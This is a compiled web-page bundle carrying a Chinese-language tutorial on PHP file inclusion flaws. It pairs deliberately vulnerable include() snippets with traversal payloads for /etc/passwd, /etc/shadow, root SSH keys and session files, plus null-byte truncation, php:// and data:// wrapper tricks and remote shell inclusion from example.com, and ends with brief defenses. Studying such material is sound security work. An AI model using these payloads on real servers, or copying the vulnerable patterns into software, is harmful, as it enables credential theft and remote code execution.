import{_ as t,V as l,W as r,Z as o,X as e,Y as a,a0 as s,$ as i,G as p}from"./framework-dfdacaa9.js";const c={},d=e("div",{class:"hint-container tip"},[e("p",{class:"hint-container-title"},"前言"),e("p",null,"PHP 文件包含漏洞的产生原因是在通过 PHP 的函数引入文件时, 由于传入的文件名没有经过合理的校验, 从而操作了预想之外的文件, 就可能导致意外的文件泄露甚至恶意的代码注入。")],-1),h=i(`<h2 id="常见文件包含函数" tabindex="-1"><a class="header-anchor" href="#常见文件包含函数" aria-hidden="true">#</a> 常见文件包含函数</h2><ul><li><strong>include()</strong>: 执行到 include 时才包含文件, 找不到被包含文件时只会产生警告, 脚本将继续执行</li><li><strong>require()</strong>: 只要程序一运行就包含文件, 找不到被包含的文件时会产生致命错误, 并停止脚本</li><li><strong>include_once()<strong>和</strong>require_once()</strong>: 若文件中代码已被包含则不会再次包含</li></ul><h2 id="利用条件" tabindex="-1"><a class="header-anchor" href="#利用条件" aria-hidden="true">#</a> 利用条件</h2><p>程序用 include() 等文件包含函数通过动态变量的范式引入需要包含的文件 用户能够控制该动态变量</p><p>注: PHP 中只要文件内容符合 PHP 语法规范, 包含时不管扩展名是什么都会被 PHP 解析, 若文件内容不符合 PHP 语法规范则会暴漏其源码。</p><h2 id="漏洞危害" tabindex="-1"><a class="header-anchor" href="#漏洞危害" aria-hidden="true">#</a> 漏洞危害</h2><ul><li>执行任意代码</li><li>包含恶意文件控制网站</li><li>甚至控制服务器</li></ul><h2 id="漏洞分类" tabindex="-1"><a class="header-anchor" href="#漏洞分类" aria-hidden="true">#</a> 漏洞分类</h2><ul><li>本地文件包含: 可以包含本地文件, 在条件允许时甚至能执行代码</li></ul><p>-- 上传图片马, 然后包含 -- 读敏感文件, 读 PHP 文件 -- 包含日志文件 GetShell -- 包含 /proc/self/envion 文件 GetShell -- 包含 data: 或 php://input 等伪协议 -- 若有 phpinfo 则可以包含临时文件</p><ul><li>远程文件包含: 可以直接执行任意代码</li></ul><p>-- 要保证 php.ini 中 allow_url_fopen 和 allow_url_include 要为 On</p><h2 id="普通本地文件包含" tabindex="-1"><a class="header-anchor" href="#普通本地文件包含" aria-hidden="true">#</a> 普通本地文件包含</h2><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;inc/&quot;</span> <span class="token operator">.</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;file&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3 id="攻击方式" tabindex="-1"><a class="header-anchor" href="#攻击方式" aria-hidden="true">#</a> 攻击方式</h3><h4 id="包含同目录下的文件" tabindex="-1"><a class="header-anchor" href="#包含同目录下的文件" aria-hidden="true">#</a> 包含同目录下的文件</h4><div class="hint-container tip"><p class="hint-container-title">攻击方式</p><p>?file=.htaccess</p></div><h4 id="目录遍历" tabindex="-1"><a class="header-anchor" href="#目录遍历" aria-hidden="true">#</a> 目录遍历</h4><div class="hint-container tip"><p class="hint-container-title">攻击方式</p><p>?file=../../../../../../../../../var/lib/locate.db<br> ?file=../../../../../../../../../var/lib/mlocate/mlocate.db<br> (linux 中这两个文件储存着所有文件的路径, 需要 root 权限)</p></div><h4 id="包含错误日志" tabindex="-1"><a class="header-anchor" href="#包含错误日志" aria-hidden="true">#</a> 包含错误日志</h4><div class="hint-container tip"><p class="hint-container-title">攻击方式</p><p>?file=../../../../../../../../../var/log/apache/error.log</p></div><h4 id="获取-web-目录或者其他配置文件" tabindex="-1"><a class="header-anchor" href="#获取-web-目录或者其他配置文件" aria-hidden="true">#</a> 获取 web 目录或者其他配置文件</h4><div class="hint-container tip"><p class="hint-container-title">攻击方式</p><p>?file=../../../../../../../../../usr/local/apache2/conf/httpd.conf</p></div><h4 id="包含上传的附件" tabindex="-1"><a class="header-anchor" href="#包含上传的附件" aria-hidden="true">#</a> 包含上传的附件</h4><div class="hint-container tip"><p class="hint-container-title">攻击方式</p><p>?file=../attachment/media/xxx.file</p></div><h4 id="读取-session-文件" tabindex="-1"><a class="header-anchor" href="#读取-session-文件" aria-hidden="true">#</a> 读取 session 文件</h4><div class="hint-container tip"><p class="hint-container-title">攻击方式</p><p>?file=../../../../../../tmp/sess_tnrdo9ub2tsdurntv0pdir1no7<br> (session 文件一般在 /tmp 目录下, 格式为 <code>sess\\_[your phpsessid value]</code> , 有时候也有可能在/var/lib/php5 之类的, 在此之前建议先读取配置文件。在某些特定的情况下如果你能够控制 session 的值, 也许你能够获得一个 shell)</p></div><h4 id="系统中重要文件-需要-root-权限" tabindex="-1"><a class="header-anchor" href="#系统中重要文件-需要-root-权限" aria-hidden="true">#</a> 系统中重要文件(需要 root 权限)</h4><ul><li><code>/root/.ssh/authorized_keys</code></li><li><code>/root/.ssh/id_rsa</code></li><li><code>/root/.ssh/id_rsa.keystore</code></li><li><code>/root/.ssh/id_rsa.pub</code></li><li><code>/root/.ssh/known_hosts</code></li><li><code>/etc/shadow</code></li><li><code>/root/.bash_history</code></li><li><code>/root/.mysql_history</code></li><li><code>/proc/self/fd/fd[0-9]* (文件标识符)</code></li><li><code>/proc/mounts</code></li><li><code>/proc/config.gz</code></li></ul><h2 id="有限制的本地文件包含" tabindex="-1"><a class="header-anchor" href="#有限制的本地文件包含" aria-hidden="true">#</a> 有限制的本地文件包含</h2><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;inc/&quot;</span> <span class="token operator">.</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;file&#39;</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">&quot;.htm&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3 id="攻击方式-1" tabindex="-1"><a class="header-anchor" href="#攻击方式-1" aria-hidden="true">#</a> 攻击方式</h3><h4 id="_00-截断" tabindex="-1"><a class="header-anchor" href="#_00-截断" aria-hidden="true">#</a> %00 截断</h4><div class="hint-container tip"><p class="hint-container-title">攻击方式</p><p>?file=../../../../../../../../../etc/passwd%00<br> (需要 magic_quotes_gpc=off, PHP 小于 5.3.4 有效)</p></div><h4 id="_00-截断目录遍历" tabindex="-1"><a class="header-anchor" href="#_00-截断目录遍历" aria-hidden="true">#</a> %00 截断目录遍历</h4><div class="hint-container tip"><p class="hint-container-title">攻击方式</p><p>?file=../../../../../../../../../var/www/%00<br> (需要 magic_quotes_gpc=off, unix 文件系统, 比如 FreeBSD, OpenBSD, NetBSD, Solaris)</p></div><h4 id="路径长度截断" tabindex="-1"><a class="header-anchor" href="#路径长度截断" aria-hidden="true">#</a> 路径长度截断:</h4><div class="hint-container tip"><p class="hint-container-title">攻击方式</p><p>?file=../../../../../../../../../etc/passwd/././././././.[...]/./././././.<br> (php 版本小于 5.2.8(?)可以成功, linux 需要文件名长于 4096, windows 需要长于 256)</p></div><h4 id="点号截断" tabindex="-1"><a class="header-anchor" href="#点号截断" aria-hidden="true">#</a> 点号截断:</h4><div class="hint-container tip"><p class="hint-container-title">攻击方式</p><p>?file=../../../../../../../../../boot.ini/.........[...]............<br> (php 版本小于 5.2.8(?)可以成功, 只适用 windows, 点号需要长于 256)</p></div><h2 id="普通远程文件包含" tabindex="-1"><a class="header-anchor" href="#普通远程文件包含" aria-hidden="true">#</a> 普通远程文件包含</h2><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;file&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3 id="攻击方式-2" tabindex="-1"><a class="header-anchor" href="#攻击方式-2" aria-hidden="true">#</a> 攻击方式</h3><h4 id="远程代码执行" tabindex="-1"><a class="header-anchor" href="#远程代码执行" aria-hidden="true">#</a> 远程代码执行:</h4><div class="hint-container tip"><p class="hint-container-title">攻击方式</p><p>?file=[http|https|ftp]://example.com/shell.txt<br> (需要 allow_url_fopen=On 并且 allow_url_include=On)</p></div><h4 id="利用-php-流-input" tabindex="-1"><a class="header-anchor" href="#利用-php-流-input" aria-hidden="true">#</a> 利用 php 流 input:</h4><div class="hint-container tip"><p class="hint-container-title">攻击方式</p><p>?file=php://input<br> (需要 allow_url_include=On)</p></div><h4 id="利用-php-流-filter" tabindex="-1"><a class="header-anchor" href="#利用-php-流-filter" aria-hidden="true">#</a> 利用 php 流 filter:</h4><div class="hint-container tip"><p class="hint-container-title">攻击方式</p><p>?file=php://filter/convert.base64-encode/resource=index.php<br> (需要 allow_url_include=On)</p></div><h4 id="利用-data-uris" tabindex="-1"><a class="header-anchor" href="#利用-data-uris" aria-hidden="true">#</a> 利用 data URIs:</h4><div class="hint-container tip"><p class="hint-container-title">攻击方式</p><p>?file=data://text/plain; base64, SSBsb3ZlIFBIUAo=<br> (需要 allow_url_include=On)</p></div><h4 id="利用-xss-执行任意代码" tabindex="-1"><a class="header-anchor" href="#利用-xss-执行任意代码" aria-hidden="true">#</a> 利用 XSS 执行任意代码:</h4>`,52),u={class:"hint-container tip"},_=e("p",{class:"hint-container-title"},"攻击方式",-1),g={href:"http://127.0.0.1/path/xss.php?xss=phpcode",target:"_blank",rel:"noopener noreferrer"},f=e("br",null,null,-1),b=i(`<h2 id="有限制的远程文件包含" tabindex="-1"><a class="header-anchor" href="#有限制的远程文件包含" aria-hidden="true">#</a> 有限制的远程文件包含</h2><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;file&#39;</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">&quot;.htm&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,2),m={class:"hint-container tip"},v=e("p",{class:"hint-container-title"},"攻击方式",-1),k={href:"http://example.com/shell",target:"_blank",rel:"noopener noreferrer"},x=e("br",null,null,-1),w={href:"http://example.com/shell.txt?",target:"_blank",rel:"noopener noreferrer"},q=e("br",null,null,-1),P={href:"http://example.com/shell.txt%23",target:"_blank",rel:"noopener noreferrer"},S=e("br",null,null,-1),O=e("br",null,null,-1),y=i('<h2 id="延伸" tabindex="-1"><a class="header-anchor" href="#延伸" aria-hidden="true">#</a> 延伸</h2><p>其实在前面也说了, 这些漏洞产生原因是 PHP 函数在引入文件时, 传入的文件名没有经过合理的校验, 从而操作了预想之外的文件。实际上我们操作文件的函数不只是 include()一个, 上面提到的一些截断的方法同样可以适用于以下函数:</p><ul><li><strong>fopen</strong></li><li><strong>file_get_contents</strong></li><li><strong>copy</strong></li><li><strong>parse_ini_file</strong></li><li><strong>readfile</strong></li><li><strong>file_put_contents</strong></li><li><strong>mkdir</strong></li><li><strong>tempnam</strong></li><li><strong>move_uploaded_file</strong></li><li><strong>rename</strong></li><li><strong>unlink</strong></li><li><strong>rmdir</strong></li><li><strong>require</strong></li><li><strong>require_once</strong></li><li><strong>include_once</strong></li><li><strong>ZipArchive::open()</strong></li></ul><h2 id="漏洞防御" tabindex="-1"><a class="header-anchor" href="#漏洞防御" aria-hidden="true">#</a> 漏洞防御</h2><ul><li>PHP 中使用 open_basedir 配置, 将访问限制在指定区域</li><li>过滤 <code>./\\</code></li><li>禁止服务器远程文件包含</li></ul>',5);function H(B,E){const n=p("ExternalLinkIcon");return l(),r("div",null,[d,o(" more "),h,e("div",u,[_,e("p",null,[a("?file="),e("a",g,[a("http://127.0.0.1/path/xss.php?xss=phpcode"),s(n)]),f,a(" (需要 allow_url_fopen=On, allow_url_include=On 并且防火墙或者白名单不允许访问外网时, 先在同站点找一个 XSS 漏洞, 包含这个页面, 就可以注入恶意代码了。条件非常极端和特殊- -)")])]),b,e("div",m,[v,e("p",null,[a("?file="),e("a",k,[a("http://example.com/shell"),s(n)]),x,a(" ?file="),e("a",w,[a("http://example.com/shell.txt?"),s(n)]),q,a(" ?file="),e("a",P,[a("http://example.com/shell.txt%23"),s(n)]),S,a(" (需要 allow_url_fopen=On 并且 allow_url_include=On)"),O,a(" ?file=\\evilshare\\shell.php (只需要 allow_url_include=On)")])]),y])}const I=t(c,[["render",H],["__file","php-file-inclusion.html.vue"]]);export{I as default};
